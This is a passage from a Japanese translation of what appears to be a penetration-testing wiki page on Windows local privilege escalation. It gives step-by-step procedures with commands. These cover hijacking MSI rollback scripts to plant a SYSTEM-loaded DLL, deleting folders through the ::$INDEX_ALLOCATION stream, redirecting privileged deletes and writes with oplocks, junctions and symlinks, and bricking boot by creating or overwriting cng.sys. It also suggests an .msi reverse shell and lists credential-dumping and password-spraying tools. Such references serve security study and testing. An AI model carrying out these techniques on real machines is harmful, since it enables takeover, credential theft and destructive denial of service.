Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにすることで、この path を修正しました。COM call は引き続き成功を返すことがありますが、攻撃者が制御する path は `TempPackages` に登録されなくなります。method の戻り値が成功したかどうかで patch を判定せず、2025 年 4 月の Windows security updates を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

手法の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` は空のままにする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **非管理者ユーザー**が実行できるよう、installer を **"UAC Compliant"** に設定します。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall process はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backups）に名前を変更し始めます。
    - 開いている file handle に対して `GetFinalPathNameByHandle` を使って **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
    - `.msi` には、次の処理を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれます。
        - `.rbf` が書き込まれたことを通知します。
        - その後、uninstall を続行する前に別の event を **待機** します。

- Step 4: `.rbf` の削除を阻止する
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを **開きます**。これにより、ファイルの **削除を阻止** します。
    - その後、uninstall が完了できるよう通知を返します。
    - Windows Installer は `.rbf` の削除に失敗し、すべての内容を削除できないため、`C:\Config.Msi` は削除されません。

- Step 5: `.rbf` を手動で削除する
    - （攻撃者である）あなたが `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空**になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability をトリガー**して `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` が付与された **handle を開いたままにします**。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な失敗を引き起こす変数。
    - この install は、`.rbs` と `.rbf` を読み込む **rollback** を再度トリガーするために使用します。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - そのファイル名を取得します。

- Step 9: Rollback 前に同期する
    - `.msi` には、次の処理を行う **custom install action (`SyncBeforeRollback`)** が含まれます。
        - `.rbs` が作成されたときに event を通知します。
        - その後、続行する前に **待機** します。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受け取った後:
        - Windows Installer は `C:\Config.Msi` に **強い ACL を再適用** します。
        - ただし、`WRITE_DAC` が付与された handle を引き続き保持しているため、**弱い ACL を再適用**できます。

> ACL は **handle を開くときにのみ適用**されるため、フォルダーへの書き込みは引き続き可能です。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意ある DLL）を、**特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元します。
    - **悪意ある SYSTEM-level payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback をトリガーする
    - sync event を通知し、installer を再開させます。
    - 既知の時点で install を **意図的に失敗**させるため、**type 19 custom action (`ErrorOut`)** が設定されています。
    - これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み込みます。
        - `.rbf` DLL を対象の場所にコピーします。
    - これで、**SYSTEM が読み込む path に悪意ある DLL が配置**されます。

- 最終ステップ: SYSTEM code を実行する
    - hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで**、あなたの code が **SYSTEM として実行**されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、**フォルダー全体**（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、脆弱性で許されるのが **任意のファイル削除**だけの場合はどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの`::$INDEX_ALLOCATION`ストリームを**削除**すると、NTFSはファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除APIを使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
任意のファイルやフォルダーは削除できないものの、攻撃者が制御するフォルダーの**内容を削除できる** primitive がある場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止**します。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。oplock が早期に解除されます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS の内部ストリームを標的にします。これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続行し、`file1.txt` を削除しようとします。
- しかし、junction と symlink によって、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します。**ファイルを書き込めない**場合や、**弱い権限を設定できない**場合でも可能です。

次のように、**重要な Windows driver** の名前を付けて**フォルダー**（ファイルではありません）を作成します。例:
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **あらかじめフォルダーとして作成しておくと**、Windows は起動時に実際の driver を読み込めません。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際の driver を解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部から介入（起動修復やディスクへのアクセスなど）しない限り、**復旧できません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイル上書き / boot DoS へ

**特権サービス**が**書き込み可能な config**から読み取ったパスにログやエクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、（SeCreateSymbolicLinkPrivilege がなくても）特権による書き込みを任意ファイルの上書きに利用できます。<sup>[[15]](#references)</sup>

**要件**
- ターゲットパスを格納した config を攻撃者が書き換えられる（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. config を読み、特権ログの出力先を特定する。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスをリダイレクトする：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例：管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を（hex/PE parserで）調べ、破損を確認します。再起動すると、Windowsは改ざんされたドライバーのパスから読み込もうとし、**boot loop DoS**が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試される可能性があります。そのため、破損データの確実なDoS先として利用できます。



## **High IntegrityからSystemへ**

### **新しいサービス**

すでにHigh Integrityプロセスを実行している場合、**新しいサービスを作成して実行するだけで**、**SYSTEMへの昇格**が簡単にできることがあります。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理をすばやく実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrity processから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法について詳しくはこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonateからFull Token privilegesへ

これらのtoken privilegeを持っている場合（すでにHigh Integrityのprocess内にいるときに見つかる可能性が高い）、SeDebug privilegeを使って（保護されたprocessを除く）**ほぼすべてのprocessを開き**、そのprocessのtokenを**コピー**して、そのtokenを使った**任意のprocessを作成**できます。\
この手法では通常、すべてのtoken privilegeを持つSYSTEM実行中のprocessを**選択します**（_はい、すべてのtoken privilegeを持たないSYSTEM processも見つかります_）。\
**提案した手法を実行するコード例は** [**こちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この手法はmeterpreterの`getsystem`で昇格する際に使われます。手順は、**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**ことです。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegeを取得できます。\
[**named pipeについて詳しく知りたい場合はこちらをお読みください**](#named-pipe-client-impersonation)。\
[name pipeを使ってhigh integrityからSystemへ移行する方法の**例はこちらをお読みください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**として実行されている**process**によって**ロード**されるdllを**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingはこの種のprivilege escalationにも有効です。また、dllのロードに使われるフォルダーへの**書き込み権限**があるため、**High Integrity processからのほうがはるかに簡単に実行できます**。\
**Dll hijackingについて詳しくは** [**こちらをご覧ください**](dll-hijacking/index.html)**。**

### **AdministratorまたはNetwork ServiceからSystemへ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICEまたはNETWORK SERVICEからfull privsへ

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのlocal privilege escalation vectorを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェック (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性をチェックし、情報を収集 (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みsession情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したpasswordをdomain内でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc vulnerabilityを検索（Watsonの登場により非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc vulnerabilityを検索（VisualStudioを使ってコンパイルする必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してhostをenumerateします（privescツールというより、情報収集ツールです）（コンパイルが必要です） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のsoftwareから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにprecompiled executableがあります）。非推奨。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（Python製のexe）。非推奨。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツールです（正常に動作するためにaccesschkは必要ありませんが、利用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを提案します（ローカルで実行するPython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを提案します（ローカルで実行するPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの.NETを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害hostにインストールされている.NETのバージョンを確認するには、次のコマンドを実行します:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用したPrivilege Escalation](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalationワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows攻撃: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalationガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalationチェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows Privilege Escalation手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServerの認証情報を復号 → Veeam CVE-2023-27532でSYSTEMを取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)とカーネルトークン窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: カーネルの影でのいたちごっこ](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Linkテストツール – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: WindowsでのSymbolic Linkの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.jsの信頼の崩壊: Windowsにおける危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectXカーネルのRace Conditionを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配するI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用したPrivilege Escalationとその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃 Part 2: CVE-2020-1013、Windows 10のLocal Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージの変更がPrivilege Escalationにつながるケース](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10のSsh AgentからSsh Private Keyを抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業のUpdate Serverをバックドア工場に変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業のUpdate Serverをバックドア工場に変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダー削除によるPrivilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: 足跡をたどってNT AUTHORITY\SYSTEMに戻る](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services共有メモリオフセットのPrivilege Escalationに関する勧告](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
